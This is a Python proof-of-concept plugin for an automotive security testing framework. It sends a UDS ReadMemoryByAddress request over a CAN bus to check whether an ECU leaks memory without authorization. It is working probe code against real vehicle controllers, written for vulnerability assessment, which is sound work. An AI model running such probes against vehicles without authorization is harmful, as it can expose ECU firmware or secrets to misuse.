"""
PoC Name: UDS ReadMemoryByAddress
Identifier: CWE-200
Component: UDS Protocol (ISO 14229)
Category: Protocol
Severity: Critical
CVSS: 8.5
Description: 尝试UDS 0x23服务读取ECU内存,检测是否存在未授权内存读取。
Prerequisites: PCAN接口, python-can库, PCAN驱动。
Usage: python3 07_UDS_ReadMemory.py PCAN_USBBUS1
"""
import sys
from iv_plugin_base import IVIVulnerabilityPlugin
from can_bus_utils import format_can_settings, get_can_settings, open_can_bus
class UDSReadMemoryPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-CAN-007"
    meta_poc_name = "UDS ReadMemory"
    meta_cve_id = "CWE-200"
    meta_severity = "Critical"
    meta_protocol = "can"
    meta_target_os = ["all"]
    meta_required_params = ["can_interface"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        settings = get_can_settings(self.params)
        self.logger.info(f"检查CAN接口: {format_can_settings(settings)}")
        return True
    def exploit(self):
        settings = get_can_settings(self.params)
        self.logger.info(f"UDS ReadMemoryByAddress测试 ({format_can_settings(settings)})...")
        try:
            import can
            bus = open_can_bus(self.params)
            # ReadMemoryByAddress: SID=0x23, addressAndLengthFormat=0x14
            # addr=0x00000000, size=0x0040
            msg = can.Message(arbitration_id=0x7E0,
                data=[0x07, 0x23, 0x14, 0x00, 0x00, 0x00, 0x00, 0x40],
                is_extended_id=False)
            bus.send(msg)
            resp = bus.recv(timeout=2.0)
            if resp and len(resp.data) > 1:
                if resp.data[1] == 0x63:
                    self.logger.warning("[+] ECU返回内存数据！存在未授权内存读取")
                    self.results["vulnerable"] = True
                    self.results["evidence"] = f"Memory read response: {resp.data.hex()}"
                elif resp.data[1] == 0x7F:
                    nrc = resp.data[3] if len(resp.data) > 3 else 0
                    self.logger.info(f"请求被拒绝 NRC=0x{nrc:02X}")
                    self.results["vulnerable"] = False
                else:
                    self.results["vulnerable"] = False
            else:
                self.logger.info("ECU未响应")
                self.results["vulnerable"] = False
            bus.shutdown()
        except ImportError:
            self.logger.error("python-can未安装")
            self.results["vulnerable"] = False
        except Exception as e:
            self.logger.error(f"UDS测试失败: {e}")
            self.results["vulnerable"] = False
        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 07_UDS_ReadMemory.py <can_interface>")
        sys.exit(1)
    plugin = UDSReadMemoryPlugin({"target_ip": "N/A", "can_interface": sys.argv[1]})
    plugin.run_verify()
